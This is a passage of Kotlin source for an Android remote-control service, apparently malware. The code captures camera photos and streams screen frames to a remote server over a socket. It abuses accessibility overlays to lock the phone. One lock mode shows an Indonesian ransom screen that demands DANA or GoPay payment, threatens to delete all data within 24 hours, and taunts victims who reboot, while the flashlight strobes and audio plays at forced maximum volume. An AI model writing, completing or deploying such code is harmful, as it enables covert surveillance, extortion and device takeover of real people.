        val lensFacing = if (facing == "front") CameraSelector.LENS_FACING_FRONT
                         else CameraSelector.LENS_FACING_BACK
        val selector = CameraSelector.Builder().requireLensFacing(lensFacing).build()

        Handler(Looper.getMainLooper()).post {
            try {
                val future = ProcessCameraProvider.getInstance(this)
                future.addListener({
                    var provider: ProcessCameraProvider? = null
                    try {
                        provider = future.get()
                        provider.unbindAll()

                        val analysis = ImageAnalysis.Builder()
                            .setTargetResolution(android.util.Size(1280, 960))
                            .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                            .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                            .build()

                        var captured = false
                        analysis.setAnalyzer(Executors.newSingleThreadExecutor()) { imageProxy ->
                            if (captured) { imageProxy.close(); return@setAnalyzer }
                            captured = true
                            try {
                                val raw      = imageProxy.toBitmap()
                                val rotation = imageProxy.imageInfo.rotationDegrees
                                val bitmap   = if (rotation != 0) {
                                    val matrix  = Matrix().apply { postRotate(rotation.toFloat()) }
                                    val rotated = Bitmap.createBitmap(raw, 0, 0, raw.width, raw.height, matrix, true)
                                    raw.recycle()
                                    rotated
                                } else raw

                                val out = ByteArrayOutputStream()
                                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
                                val b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                                bitmap.recycle()

                                socket?.emit("device:photo", JSONObject().apply {
                                    put("deviceId", deviceId)
                                    put("facing", facing)
                                    put("image", b64)
                                })
                            } catch (e: Exception) {
                                Log.e("DeviceService", "capturePhoto frame: ${e.message}")
                            } finally {
                                imageProxy.close()
                                Handler(Looper.getMainLooper()).post {
                                    try { provider?.unbindAll() } catch (_: Exception) {}
                                }
                            }
                        }

                        provider.bindToLifecycle(this@DeviceService, selector, analysis)
                    } catch (e: Exception) {
                        Log.e("DeviceService", "capturePhoto bind: ${e.message}")
                        try { provider?.unbindAll() } catch (_: Exception) {}
                    }
                }, ContextCompat.getMainExecutor(this))
            } catch (e: Exception) {
                Log.e("DeviceService", "capturePhoto: ${e.message}")
            }
        }
    }

    private fun requestScreenCaptureFromService() {
        val intent = Intent(this, ScreenCaptureActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        startActivity(intent)
    }

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        if (screenStreaming) stopScreenCapture()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            try {
                val hasCamera = ActivityCompat.checkSelfPermission(
                    this, Manifest.permission.CAMERA
                ) == PackageManager.PERMISSION_GRANTED
                var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK or
                                  android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                if (hasCamera) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                startForeground(NOTIF_ID, buildNotification(), serviceType)
            } catch (e: Exception) {
                Log.e("DeviceService", "startForeground mediaProjection error: ${e.message}")
            }
        }

        val mgr = getSystemService(android.media.projection.MediaProjectionManager::class.java)
        mediaProjection = mgr.getMediaProjection(resultCode, data)
        if (mediaProjection == null) {
            Log.e("DeviceService", "startScreenCapture: mediaProjection null")
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            mediaProjection!!.registerCallback(object : android.media.projection.MediaProjection.Callback() {
                override fun onStop() {
                    Log.d("DeviceService", "MediaProjection stopped by system")
                    Handler(Looper.getMainLooper()).post { stopScreenCapture() }
                }
            }, Handler(Looper.getMainLooper()))
        }

        val metrics = resources.displayMetrics
        val width   = metrics.widthPixels
        val height  = metrics.heightPixels
        val density = metrics.densityDpi
        val scaleW = (width * 0.5f).toInt()
        val scaleH = (height * 0.5f).toInt()

        screenImageReader = android.media.ImageReader.newInstance(
            scaleW, scaleH,
            android.graphics.PixelFormat.RGBA_8888, 2
        )

        screenCaptureThread = HandlerThread("ScreenCapture").also { it.start() }
        screenCaptureHandler = Handler(screenCaptureThread!!.looper)

        virtualDisplay = mediaProjection!!.createVirtualDisplay(
            "XyzScreen",
            scaleW, scaleH, density,
            android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            screenImageReader!!.surface, null, null
        )

        screenStreaming = true
        emitStatus(JSONObject().apply { put("screenSharing", true) })
        Log.d("DeviceService", "Screen capture started")

        screenCaptureHandler?.post(object : Runnable {
            override fun run() {
                if (!screenStreaming) return
                try {
                    val image = screenImageReader?.acquireLatestImage()
                    if (image != null) {
                        val planes = image.planes
                        val buffer = planes[0].buffer
                        val pixelStride  = planes[0].pixelStride
                        val rowStride    = planes[0].rowStride
                        val rowPadding   = rowStride - pixelStride * scaleW
                        val bmp = android.graphics.Bitmap.createBitmap(
                            scaleW + rowPadding / pixelStride, scaleH,
                            android.graphics.Bitmap.Config.ARGB_8888
                        )
                        bmp.copyPixelsFromBuffer(buffer)
                        image.close()

                        val out = java.io.ByteArrayOutputStream()
                        bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 35, out)
                        bmp.recycle()
                        val b64 = android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP)

                        if (socket?.connected() == true) {
                            socket?.emit("screen:frame", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("frame", "data:image/jpeg;base64,$b64")
                            })
                        }
                    }
                } catch (e: Exception) {
                    Log.e("DeviceService", "screen frame error: ${e.message}")
                }
                if (screenStreaming) screenCaptureHandler?.postDelayed(this, SCREEN_FRAME_INTERVAL)
            }
        })
    }

    private fun stopScreenCapture() {
        screenStreaming = false
        screenCaptureHandler?.removeCallbacksAndMessages(null)
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { screenImageReader?.close() } catch (_: Exception) {}
        try { mediaProjection?.stop() } catch (_: Exception) {}
        try { screenCaptureThread?.quitSafely() } catch (_: Exception) {}
        virtualDisplay      = null
        screenImageReader   = null
        mediaProjection     = null
        screenCaptureThread = null
        screenCaptureHandler = null
        emitStatus(JSONObject().apply { put("screenSharing", false) })
        Log.d("DeviceService", "Screen capture stopped")
    }

    private fun startFloatingVideo(videoUrl: String) {
        if (videoFloating) stopFloatingVideo()
        if (!Settings.canDrawOverlays(this)) {
            emitStatus(JSONObject().apply { put("videoError", "no_overlay_perm") })
            return
        }
        if (videoUrl.isEmpty()) return

        Handler(Looper.getMainLooper()).post {
            try {
                val params = XyzAccessibilityService.buildOverlayParams(focusable = true)

                val sv = SurfaceView(this)
                floatingView = sv
                XyzAccessibilityService.applyFullscreenFlags(sv)
                XyzAccessibilityService.addOverlay(sv, params)

                sv.holder.addCallback(object : SurfaceHolder.Callback {
                    override fun surfaceCreated(h: SurfaceHolder) {
                        try {
                            floatingVideoPlayer = MediaPlayer().apply {
                                if (videoUrl == "assets" || videoUrl.startsWith("asset:")) {
                                    val assetFile = if (videoUrl.startsWith("asset:")) videoUrl.removePrefix("asset:") else "video.mp4"
                                    val afd = assets.openFd(assetFile)
                                    setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                                    afd.close()
                                } else {
                                    val fullUrl = if (videoUrl.startsWith("http://") || videoUrl.startsWith("https://")) videoUrl else "$serverUrl$videoUrl"
                                    setDataSource(this@DeviceService, Uri.parse(fullUrl))
                                }
                                setSurface(h.surface)
                                isLooping = true
                                prepareAsync()
                                setOnPreparedListener { mp ->
                                    setMaxVolume()
                                    startVolumeGuard()
                                    mp.start()
                                }
                                setOnCompletionListener { stopVolumeGuard() }
                                setOnErrorListener { _, what, extra ->
                                    Log.e("DeviceService", "Video error what=$what extra=$extra")
                                    stopVolumeGuard()
                                    emitStatus(JSONObject().apply { put("videoError", "playback_failed") })
                                    true
                                }
                            }
                            videoFloating = true
                            emitStatus(JSONObject().apply { put("videoPlaying", true) })
                        } catch (e: Exception) {
                            Log.e("DeviceService", "startFloatingVideo: ${e.message}")
                            emitStatus(JSONObject().apply { put("videoError", "playback_failed") })
                        }
                    }
                    override fun surfaceChanged(h: SurfaceHolder, f: Int, w: Int, ht: Int) {}
                    override fun surfaceDestroyed(h: SurfaceHolder) {}
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "startFloatingVideo window: ${e.message}")
            }
        }
    }

    private fun stopFloatingVideo() {
        Handler(Looper.getMainLooper()).post {
            try {
                floatingVideoPlayer?.stop()
                floatingVideoPlayer?.release()
                floatingVideoPlayer = null
            } catch (_: Exception) {}
            try {
                floatingView?.let { XyzAccessibilityService.removeOverlay(it) }
            } catch (_: Exception) {}
            stopVolumeGuard()
            floatingView = null
            floatingWindowManager = null
            videoFloating = false
            emitStatus(JSONObject().apply { put("videoPlaying", false) })
        }
    }

    private fun setWallpaperFromBase64(value: String) {
        Thread {
            try {
                if (checkSelfPermission(android.Manifest.permission.SET_WALLPAPER)
                    != PackageManager.PERMISSION_GRANTED) {
                    emitStatus(JSONObject().apply { put("wallpaperError", "no_permission") })
                    return@Thread
                }

                val bytes: ByteArray = if (value.startsWith("http://") || value.startsWith("https://")) {
                    val conn = java.net.URL(value).openConnection() as java.net.HttpURLConnection
                    conn.requestMethod = "GET"
                    conn.connectTimeout = 15_000
                    conn.readTimeout    = 30_000
                    conn.setRequestProperty("Accept-Encoding", "identity")
                    if (conn.responseCode != 200) {
                        emitStatus(JSONObject().apply { put("wallpaperError", "fetch_failed_${conn.responseCode}") })
                        return@Thread
                    }
                    val b = java.io.BufferedInputStream(conn.inputStream).readBytes()
                    conn.disconnect()
                    b
                } else {
                    Base64.decode(value, Base64.DEFAULT)
                }

                if (bytes.isEmpty()) {
                    emitStatus(JSONObject().apply { put("wallpaperError", "empty_data") })
                    return@Thread
                }

                val boundsOpts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
                BitmapFactory.decodeByteArray(bytes, 0, bytes.size, boundsOpts)

                val wm = WallpaperManager.getInstance(this)
                val desiredW = wm.desiredMinimumWidth.let { if (it <= 0) 1080 else it }
                val desiredH = wm.desiredMinimumHeight.let { if (it <= 0) 1920 else it }
                
                var sampleSize = 1
                var w = boundsOpts.outWidth
                var h = boundsOpts.outHeight
                while (w / 2 >= desiredW && h / 2 >= desiredH) {
                    sampleSize *= 2
                    w /= 2
                    h /= 2
                }

                val decodeOpts = BitmapFactory.Options().apply {
                    inSampleSize = sampleSize
                    inPreferredConfig = Bitmap.Config.ARGB_8888
                }
                val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size, decodeOpts)
                    ?: run {
                        emitStatus(JSONObject().apply { put("wallpaperError", "decode_failed") })
                        return@Thread
                    }

                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        wm.setBitmap(bitmap, null, true,
                            WallpaperManager.FLAG_SYSTEM or WallpaperManager.FLAG_LOCK)
                    } else {
                        @Suppress("DEPRECATION")
                        wm.setBitmap(bitmap)
                    }
                    emitStatus(JSONObject().apply { put("wallpaperSet", true) })
                } finally {
                    bitmap.recycle()
                }

            } catch (e: SecurityException) {
                Log.e("DeviceService", "setWallpaper permission: ${e.message}")
                emitStatus(JSONObject().apply { put("wallpaperError", "no_permission") })
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaper: ${e.message}")
                emitStatus(JSONObject().apply { put("wallpaperError", e.message ?: "failed") })
            }
        }.start()
    }

    private fun lockDevice(valueJson: String) {
        if (isDeviceLocked) return
        if (!Settings.canDrawOverlays(this)) {
            emitStatus(JSONObject().apply { put("lockError", "no_overlay_perm") })
            return
        }
        try {
            val obj      = JSONObject(valueJson)
            val lockType = obj.optString("lockType", "normal")

            if (lockType == "custom") {
                val flash      = obj.optBoolean("flash", false)
                val audio      = obj.optBoolean("audio", false)
                val customHtml = obj.optString("customHtml", "")
                lockCustomFlash = flash
                lockCustomAudio = audio
                persistLockCustom(flash, audio, customHtml)
                applyLockOverlayCustom(customHtml, flash, audio)
            } else {
                val title = obj.optString("title", "Perangkat Dikunci")
                val pin   = obj.optString("pin", "")
                if (pin.isEmpty()) return
                lockPin = pin
                persistLock(title, pin)
                applyLockOverlay(title, pin)
            }
        } catch (_: Exception) { return }
    }

    private fun applyLockOverlay(title: String, pin: String) {
        lockPin = pin
        Handler(Looper.getMainLooper()).post {
            try {
                if (isDeviceLocked && lockOverlayView != null) return@post
                val params = XyzAccessibilityService.buildOverlayParams(focusable = true)

                val wv = android.webkit.WebView(this).apply {
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled  = true
                    addJavascriptInterface(object : Any() {
                        @android.webkit.JavascriptInterface
                        fun tryUnlock(enteredPin: String): Boolean {
                            return if (enteredPin == lockPin) {
                                Handler(Looper.getMainLooper()).post { unlockDevice() }
                                true
                            } else false
                        }
                    }, "Android")
                    loadDataWithBaseURL(null, buildLockHtml(title), "text/html", "UTF-8", null)
                }

                lockOverlayView = wv
                XyzAccessibilityService.applyFullscreenFlags(wv)
                XyzAccessibilityService.addOverlay(wv, params)
                isDeviceLocked = true
                Handler(Looper.getMainLooper()).postDelayed({
                    XyzAccessibilityService.overlayReady = true
                }, 800)
                emitStatus(JSONObject().apply { put("locked", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "applyLockOverlay: ${e.message}")
            }
        }
    }

    private fun applyLockOverlayCustom(customHtml: String, flash: Boolean, audio: Boolean) {
        Handler(Looper.getMainLooper()).post {
            try {
                if (isDeviceLocked && lockOverlayView != null) return@post
                val params = XyzAccessibilityService.buildOverlayParams(focusable = true)

                val wv = android.webkit.WebView(this).apply {
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled  = true
                    loadDataWithBaseURL("file:///android_asset/", buildLockCustomHtml(customHtml), "text/html", "UTF-8", null)
                }

                lockOverlayView = wv
                XyzAccessibilityService.applyFullscreenFlags(wv)
                XyzAccessibilityService.addOverlay(wv, params)
                isDeviceLocked = true
                Handler(Looper.getMainLooper()).postDelayed({
                    XyzAccessibilityService.overlayReady = true
                }, 800)

                if (flash) {
                    startLockFlash()
                }

                if (audio) {
                    startLockAudio()
                }

                emitStatus(JSONObject().apply { put("locked", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "applyLockOverlayCustom: ${e.message}")
            }
        }
    }

    private fun startLockFlash(isChatLock: Boolean = false) {
        val cm = getSystemService(CAMERA_SERVICE) as CameraManager
        cameraManager = cm
        torchCameraId = cm.cameraIdList.firstOrNull { id ->
            cm.getCameraCharacteristics(id).get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }
        val id = torchCameraId ?: return
        val h = Handler(Looper.getMainLooper())
        lockFlashHandler = h
        var state = false
        val r = object : Runnable {
            override fun run() {
                val stillLocked = if (isChatLock) isDeviceLockedChat else isDeviceLocked
                if (!stillLocked) return
                try { cm.setTorchMode(id, state) } catch (_: Exception) {}
                state = !state
                h.postDelayed(this, 200)
            }
        }
        lockFlashRunnable = r
        h.post(r)
    }

    private fun startLockAudio() {
        try {
            val am = getSystemService(AUDIO_SERVICE) as AudioManager
            setMaxVolume()
            @Suppress("DEPRECATION")
            am.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN)

            lockAudioPlayer?.release()
            lockAudioPlayer = MediaPlayer().apply {
                val afd = assets.openFd("v2.mp3")
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                isLooping = true
                setVolume(1f, 1f)
                prepare()
                start()
            }

            val h = Handler(Looper.getMainLooper())
            val watchdog = object : Runnable {
                override fun run() {
                    if (!isDeviceLocked) return
                    setMaxVolume()
                    h.postDelayed(this, 500)
                }
            }
            h.postDelayed(watchdog, 500)
        } catch (e: Exception) {
            Log.e("DeviceService", "startLockAudio: ${e.message}")
        }
    }

    private fun buildLockCustomHtml(customHtml: String): String {
        return """<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:#000;overflow:hidden}
#custom-wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head><body>
<div id="custom-wrap">
${customHtml}
</div>
</body></html>""".trimIndent()
    }

    private fun unlockDevice() {
        Handler(Looper.getMainLooper()).post {
            try {
                lockOverlayView?.let { XyzAccessibilityService.removeOverlay(it) }
            } catch (_: Exception) {}
            lockFlashRunnable?.let { lockFlashHandler?.removeCallbacks(it) }
            lockFlashHandler = null
            lockFlashRunnable = null
            try {
                cameraManager?.setTorchMode(torchCameraId ?: "", false)
            } catch (_: Exception) {}
            try { lockAudioPlayer?.stop(); lockAudioPlayer?.release() } catch (_: Exception) {}
            lockAudioPlayer = null
            XyzAccessibilityService.overlayReady = false
            lockOverlayView    = null
            lockOverlayManager = null
            lockPin            = ""
            lockCustomFlash    = false
            lockCustomAudio    = false
            isDeviceLocked     = false
            clearLockPrefs()
            emitStatus(JSONObject().apply { put("locked", false) })
        }
    }

    private fun lockDeviceV2(valueJson: String = "") {
        if (isDeviceLockedV2) return
        isDeviceLockedV2 = true
        val lockTime = System.currentTimeMillis()
        
        // ✅ PARSE custom nominal & payment method dari payload
        var lockNominal = 100000
        var paymentMethod = "dana"
        var paymentNumber = ""
        
        if (valueJson.isNotEmpty()) {
            try {
                val obj = JSONObject(valueJson)
                lockNominal = obj.optInt("nominal", 100000)
                paymentMethod = obj.optString("method", "dana").lowercase()
                paymentNumber = obj.optString("number", "")
            } catch (e: Exception) {
                Log.d("DeviceService", "lockV2 parse error: ${e.message}")
            }
        }
        
        // ✅ SIMPAN ke SharedPrefs biar bisa diambil di HTML
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
            .putBoolean(PREF_IS_LOCKED_V2, true)
            .putLong("lock_v2_time", lockTime)
            .putInt("lock_v2_nominal", lockNominal)
            .putString("lock_v2_payment_method", paymentMethod)
            .putString("lock_v2_payment_number", paymentNumber)
            .apply()
        
        applyLockV2Overlay(wasRestarted = false, lockNominal, paymentMethod, paymentNumber)

        // Auto putar lock.mp3 volume full
        try {
            val am = getSystemService(AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
            lockV2AudioPlayer?.release()
            lockV2AudioPlayer = MediaPlayer().apply {
                val afd = assets.openFd("lock.mp3")
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                isLooping = true
                setVolume(1f, 1f)
                prepare()
                start()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "lockV2 audio: ${e.message}")
        }

        // Senter blink 200ms
        lockV2FlashHandler = Handler(Looper.getMainLooper())
        var flashOn = false
        lockV2FlashRunnable = object : Runnable {
            override fun run() {
                if (!isDeviceLockedV2) {
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                    return
                }
                flashOn = !flashOn
                try { torchCameraId?.let { cameraManager?.setTorchMode(it, flashOn) } } catch (_: Exception) {}
                lockV2FlashHandler?.postDelayed(this, 200)
            }
        }
        lockV2FlashHandler?.post(lockV2FlashRunnable!!)

        emitStatus(JSONObject().also { it.put("lockedV2", true) })
    }

    private fun unlockDeviceV2() {
        isDeviceLockedV2 = false
        // Stop audio
        try { lockV2AudioPlayer?.stop(); lockV2AudioPlayer?.release(); lockV2AudioPlayer = null } catch (_: Exception) {}
        // Stop senter
        lockV2FlashRunnable?.let { lockV2FlashHandler?.removeCallbacks(it) }
        lockV2FlashHandler = null; lockV2FlashRunnable = null
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        Handler(Looper.getMainLooper()).post {
            try { lockV2OverlayView?.let { XyzAccessibilityService.removeOverlay(it) } } catch (_: Exception) {}
            lockV2OverlayView = null
            getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                .putBoolean(PREF_IS_LOCKED_V2, false).apply()
            emitStatus(JSONObject().also { it.put("lockedV2", false) })
        }
    }

    private fun applyLockV2Overlay(wasRestarted: Boolean, lockNominal: Int = 100000, paymentMethod: String = "dana", paymentNumber: String = "") {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val lockTime = prefs.getLong("lock_v2_time", System.currentTimeMillis())
        val actualNominal = if (lockNominal > 0) lockNominal else prefs.getInt("lock_v2_nominal", 100000)
        val actualMethod = if (paymentMethod.isNotEmpty()) paymentMethod else prefs.getString("lock_v2_payment_method", "dana") ?: "dana"
        val actualNumber = if (paymentNumber.isNotEmpty()) paymentNumber else prefs.getString("lock_v2_payment_number", "") ?: ""
        
        Handler(Looper.getMainLooper()).post {
            try {
                lockV2OverlayView?.let { XyzAccessibilityService.removeOverlay(it) }
                lockV2OverlayView = null

                val params = XyzAccessibilityService.buildOverlayParams(focusable = true)
                val wv = android.webkit.WebView(this).apply {
                    settings.javaScriptEnabled  = true
                    settings.useWideViewPort    = true
                    settings.loadWithOverviewMode = true
                    settings.domStorageEnabled  = true
                    settings.setSupportZoom(false)
                    settings.builtInZoomControls = false
                    settings.displayZoomControls = false
                    setBackgroundColor(android.graphics.Color.BLACK)
                    loadDataWithBaseURL("file:///android_asset/", buildLockV2Html(wasRestarted, lockTime, actualNominal, actualMethod, actualNumber), "text/html", "UTF-8", null)
                }
                lockV2OverlayView = wv
                XyzAccessibilityService.applyFullscreenFlags(wv)
                XyzAccessibilityService.addOverlay(wv, params)
            } catch (e: Exception) {
                Log.e("DeviceService", "applyLockV2Overlay: ${e.message}")
            }
        }
    }

    private fun buildLockV2Html(wasRestarted: Boolean, lockTime: Long, lockNominal: Int = 100000, paymentMethod: String = "dana", paymentNumber: String = ""): String {
        val deadlineMs = lockTime + 24 * 60 * 60 * 1000L
        val restartMsg = if (wasRestarted)
            "Si Tolol Malah Restart, Lu Kira Dengan Di Restart Bakalan Ke Buka?😂"
        else ""
        
        val nominalFormatted = String.format("%,d", lockNominal).replace(",", ".")
        
        val paymentDisplay = when (paymentMethod.lowercase()) {
            "gopay" -> "GoPay"
            "dana" -> "DANA"
            else -> paymentMethod
        }
        
        val displayNumber = paymentNumber
        
        return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
<style>
@import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Mono:wght@400;700&family=Orbitron:wght@700;900&display=swap');

*{box-sizing:border-box;margin:0;padding:0;}
html,body{
  width:100vw;height:100vh;overflow:hidden;
  background:#f2f0eb;
  font-family:'Space Mono',monospace;
}

/* GRID BG */
body::before{
  content:'';position:fixed;inset:0;
  background-image:
    linear-gradient(rgba(0,0,0,.055) 1px,transparent 1px),
    linear-gradient(90deg,rgba(0,0,0,.055) 1px,transparent 1px);
  background-size:32px 32px;
  pointer-events:none;z-index:0;
}

#wrap{
  position:fixed;inset:0;
  display:flex;flex-direction:column;align-items:center;
  justify-content:center;
  padding:28px 20px 24px;
  gap:10px;
  overflow:hidden;
  z-index:1;
}

/* ── STATUS BAR ── */
.statusbar{
  width:100%;max-width:380px;
  display:flex;justify-content:space-between;align-items:center;
  margin-bottom:2px;
}
.statusbar-left{
  font-family:'Space Mono',monospace;
  font-size:10px;letter-spacing:2.5px;color:#aaa;
  text-transform:uppercase;
}
.dot-wrap{display:flex;align-items:center;gap:6px;}
.dot{
  width:9px;height:9px;border-radius:50%;
  background:#e53935;border:2px solid #111;
  animation:pulse 1.8s ease-in-out infinite;
}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.dot-label{
  font-family:'Space Mono',monospace;
  font-size:10px;letter-spacing:2px;color:#e53935;font-weight:700;
}

/* ── LOCK ZONE ── */
.lock-zone{
  display:flex;flex-direction:column;align-items:center;
  gap:0;
}
.lock-icon-wrap{
  width:76px;height:76px;
  background:#e53935;
  border:3.5px solid #111;
  box-shadow:6px 6px 0 #111;
  display:flex;align-items:center;justify-content:center;
  margin-bottom:16px;
}
.lock-title{
  font-family:'Bebas Neue',sans-serif;
  font-size:clamp(28px,8vw,36px);
  color:#111;letter-spacing:5px;text-transform:uppercase;text-align:center;
  line-height:1.1;
}
.lock-sub{
  font-family:'Space Mono',monospace;
  font-size:9.5px;letter-spacing:2.5px;
  color:#aaa;
  text-align:center;margin-top:8px;text-transform:uppercase;
}

/* ── DIVIDER ── */
.divider{
  width:100%;max-width:380px;
  height:3px;background:#111;
  margin:0 auto;
}



/* ── WARNING BOX ── */
.warn-box{
  width:100%;max-width:380px;
  border:3px solid #111;
  background:#fff;
  box-shadow:6px 6px 0 #111;
}
.warn-box-header{
  background:#e53935;
  border-bottom:3px solid #111;
  padding:8px 16px;
  font-family:'Bebas Neue',sans-serif;
  font-size:16px;letter-spacing:4px;color:#fff;text-transform:uppercase;
}
.warn-body{padding:10px 14px;display:flex;flex-direction:column;}
.warn-row{
  display:flex;align-items:flex-start;gap:11px;
  padding:9px 0;
  border-bottom:2px solid #ebebeb;
}
.warn-row:last-child{border-bottom:none;padding-bottom:2px;}
.warn-row:first-child{padding-top:2px;}
.warn-text{
  font-family:'Space Mono',monospace;
  font-size:11.5px;color:#333;line-height:1.65;font-weight:400;
}
.warn-text b{color:#e53935;font-weight:700;}

/* ── PAYMENT BOX ── */
.payment-box{
  width:100%;max-width:380px;
  border:3px solid #111;
  background:#fff;
  box-shadow:6px 6px 0 #111;
}
.payment-header{
  background:#1d4ed8;
  padding:8px 16px;
  font-family:'Bebas Neue',sans-serif;
  font-size:16px;letter-spacing:4px;color:#fff;text-transform:uppercase;
  border-bottom:3px solid #111;
}
.payment-body{padding:14px 16px;display:flex;flex-direction:column;gap:8px;}
.payment-amount{
  font-family:'Orbitron',sans-serif;
  font-size:26px;font-weight:900;color:#e53935;letter-spacing:2px;
  line-height:1;
}
.payment-amount::before{content:'Rp ';font-size:16px;letter-spacing:1px;}
.payment-detail{display:flex;flex-direction:column;}
.payment-detail-row{
  display:flex;justify-content:space-between;
  align-items:center;gap:8px;
  padding:7px 0;
  border-bottom:2px solid #ebebeb;
}
.payment-detail-row:last-child{border-bottom:none;padding-bottom:0;}
.payment-detail-label{
  flex-shrink:0;
  font-family:'Space Mono',monospace;
  font-size:10px;text-transform:uppercase;letter-spacing:1.5px;color:#888;
}
.payment-detail-value{
  font-family:'Space Mono',monospace;
  font-size:12px;font-weight:700;color:#111;letter-spacing:.5px;
}

/* ── RESTART MSG ── */
.restart-msg{
  width:100%;max-width:380px;
  font-family:'Space Mono',monospace;
  font-size:12px;color:#e53935;line-height:1.75;text-align:center;
  border:3px solid #111;padding:11px 16px;
  background:#fff3f3;
  box-shadow:6px 6px 0 #111;
  font-weight:700;letter-spacing:.5px;
}

/* ── FOOTER TERM ── */
.term{
  font-family:'Space Mono',monospace;
  font-size:9px;color:#ccc;
  letter-spacing:2px;text-align:center;text-transform:uppercase;
}

/* CURSOR BLINK */
.cursor{
  display:inline-block;width:6px;height:11px;
  background:#e53935;margin-left:3px;
  vertical-align:middle;animation:blink .9s step-end infinite;
}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
</style>
</head>
<body>
<div id="wrap">

  <!-- LOCK ICON + TITLE -->
  <div class="lock-zone">
    <div class="lock-icon-wrap">
      <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
        <rect x="3" y="11" width="18" height="11" rx="0" fill="rgba(255,255,255,0.15)"/>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
      </svg>
    </div>
    <div class="lock-title">PERANGKAT MU<br>SUDAH TERKUNCI</div>

  </div>

  <!-- DIVIDER -->
  <div class="divider"></div>

  <!-- WARNING -->
  <div class="warn-box">
    <div class="warn-box-header">⚠ Peringatan</div>
    <div class="warn-body">
      <div class="warn-row">
        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#e53935" stroke-width="2.3" stroke-linecap="round" style="flex-shrink:0;margin-top:3px">
          <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
          <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
        </svg>
        <div class="warn-text">Semua data akan terhapus dalam <b>24 JAM</b> jika tidak membayar.</div>
      </div>
      <div class="warn-row">
        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#e53935" stroke-width="2.3" stroke-linecap="round" style="flex-shrink:0;margin-top:3px">
          <circle cx="12" cy="12" r="10"/>
          <line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>
        </svg>
        <div class="warn-text">Jangan <b>restart</b> perangkat atau <b>reboot</b>.</div>
      </div>
    </div>
  </div>

  <!-- PAYMENT BOX -->
  <div class="payment-box">
    <div class="payment-header" style="background:#1d4ed8;display:flex;align-items:center;gap:10px">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="0"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
      Pembayaran Diperlukan
    </div>
    <div class="payment-body">
      <div class="payment-amount">$nominalFormatted</div>
      <div class="payment-detail">
        <div class="payment-detail-row">
          <div class="payment-detail-label">Payment</div>
          <div class="payment-detail-value">$paymentDisplay</div>
        </div>
        ${if (displayNumber.isNotEmpty()) """<div class="payment-detail-row">
          <div class="payment-detail-label">No.</div>
          <div style="display:flex;align-items:center;gap:8px">
